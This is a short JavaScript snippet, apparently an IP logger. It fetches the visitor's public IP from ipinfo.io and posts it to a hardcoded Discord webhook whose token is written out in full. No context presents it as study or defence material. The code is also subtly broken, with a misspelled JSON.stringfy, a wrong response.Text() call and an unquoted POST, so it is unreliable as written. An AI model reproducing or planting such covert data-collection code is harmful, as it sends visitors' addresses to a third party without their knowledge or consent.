wh = "https://discord.com/api/webhooks/1245497201455661078/B1ADClP5PljIBKSjuEpDUCX01_lXa7hAr_Mhi-5FJDEr18R0daQjqD0ItODgVmsC7EdQ" + "?wait=true"

fetch("https://ipinfo.io/ip")
.then(response => response.Text())
.then(ip => {
    const requestData = { content : ip}

    fetch(wh, {
    method : POST,
    headers : {"content-type":"application/json"},
    body : JSON.stringfy(requestData) 

})
})